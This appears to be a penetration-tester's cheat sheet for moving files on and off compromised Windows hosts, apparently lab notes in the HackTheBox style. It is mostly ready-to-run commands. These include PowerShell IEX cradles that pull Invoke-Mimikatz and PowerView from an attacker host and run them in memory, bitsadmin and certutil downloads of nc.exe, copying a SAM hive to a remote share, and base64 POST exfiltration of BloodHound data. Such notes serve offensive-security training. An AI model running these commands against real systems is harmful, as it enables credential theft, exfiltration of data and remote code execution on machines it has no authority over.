# Windows File Transfer

## Smb Server / Mount share

```
smbserver.py -smb2support -username gust -password guest share /root/htb

#Mount 
net use x: \\<IP>\share /user:guest <password>
#Download
cmd /c "copy file.txt X:\"
move sam.save \\10.10.15.16\CompData

$pass = convertto-securestring 'staphy' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('staphy',$pass)
New-PSDrive -Name "staphy" -PSProvider "FileSystem" -Credential $creds -Root "\\<IP>\Public"
cd staphy:
```



## PowerShell

### PowerShell Downloads

```
#System.Net.WebClient class can be used to download a file over HTTP.
(New-Object System.Net.WebClient).DownloadFile('http://<IP>:PORT/file.EXT',"C:\Outfile.EXT")

#From PowerShell 3.0 Invoke-WebRequest but slower,
#Alias iwr, curl, wget can be used instead of Invoke-WebRequest
Invoke-WebRequest http://<IP>:PORT/file.Ext -OutFile file.Ext

#Execute Payload directly into memory using Invoke-Expression
#Alias iex
IEX (New-Object Net-WebClient).DownloadString('http://<IP>:PORT/Invoke-Mimikatz.ps1')

#IEX also accepts pipeline input
Invoke-WebRequest https://<IP>:PORT/Invoke-Mimikatz.ps1 | iex
```

{% hint style="danger" %}
There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.

This can be bypassed using the parameter `-UseBasicParsing`

```
Invoke-WebRequest https://<ip>/PowerView.ps1 | iex
Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand


# FIX
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex
Invoke-CheckLocalAdminAccess

ComputerName IsAdmin
------------ -------
localhost      False

# with administrative access to the machine, we can disable Internet Explorer’s First Run customization
reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2
```
{% endhint %}

> Powershell download cradles that do not observe Internet Explorer’s first-run check can also be used. Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity with them and their individual nuances, such as not observing a proxy or touching a disk to select the appropriate one for the situation.

### PowerShell Uploads

```
#Invoke-WebRequest or Invoke-RestMethod
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/Bloodhound.zip' -Encoding Byte))
Invoke-WebRequest -Uri http://<IP>:433 -Method POST -Body $b64

#after catching 64data with ncat
echo <base64> | base64 -d -w 0 > bloodhound.zip
```

## Bitadmin

### Download

```
#Background Intelligent Transfer Service
#Can download from HTTP sites and SMB shares
bitsadmin /transfer n http://<IP>/nc.exe C:\Temp\nc.exe

#PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.
Import-Module bitstransfer;Start-BitsTransfer -Source "http://<IP>/nc.exe" -Destination "C:\Temp\nc.exe"
```

### Upload

```
start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql        
```

## Certutil

```
#available in all Windows versions
certutil.exe -encode C:\Users\Alfred\Downloads\backups\backup.zip c:\\windows\\temp\backup.b64
type c:\windows\temp #then copy and paste in your machine
vi backup.base64
base64 -d backup.base64 > backup.zip
#the Antimalware Scan Interface (AMSI) currently detects this as malicious certutil usage.
certutil.exe -verifyctl -split -f http://<IP>/nc.exe
```

